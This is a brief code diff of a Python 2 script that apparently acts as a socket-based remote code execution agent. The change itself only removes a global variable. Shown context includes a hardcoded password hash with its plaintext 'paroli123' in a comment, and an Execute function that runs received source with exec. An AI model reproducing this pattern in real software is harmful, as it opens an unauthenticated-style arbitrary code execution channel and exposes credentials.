@@ -12,7 +12,6 @@ import platform
 HOST = '127.0.0.1'
 PORT = 4434
 active = False
-data = ''
 passKey = r'1705a7f91b40320a19db18912b72148e' # key: paroli123
 __version__ = '1.0'
 
@@ -36,7 +35,6 @@ def Receive(sock, end="[ENDOFMESSAGE]"):
 
 
 def Execute(source):
-    global data
     data = ''
     try:
         exec source
